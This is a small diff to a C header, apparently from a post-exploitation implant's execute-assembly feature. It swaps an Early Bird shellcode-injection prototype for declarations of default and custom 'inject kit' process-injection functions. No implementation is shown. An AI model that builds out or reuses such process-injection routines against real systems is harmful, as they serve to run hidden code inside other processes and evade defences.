@@ -8,7 +8,15 @@
 
 #ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY
 
-BOOL InjectProcessViaEarlyBird(_In_ PBYTE buf, _In_ SIZE_T szShellcodeLen, _Out_ PCHAR* outData);
+typedef struct _Arg {
+    char* value;
+    size_t size;
+    BOOL includeSize;
+} Arg;
+
+BOOL InjectCustomKit(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _In_ PCHAR InjectKit, _In_ SIZE_T kitLen, _Out_ PCHAR* outData);
+BOOL InjectDefault(_In_ PBYTE buffer, _In_ SIZE_T bufferLen, _Out_ PCHAR* outData);
+
 
 #endif // INCLUDE_CMD_EXECUTE_ASSEMBLY
 
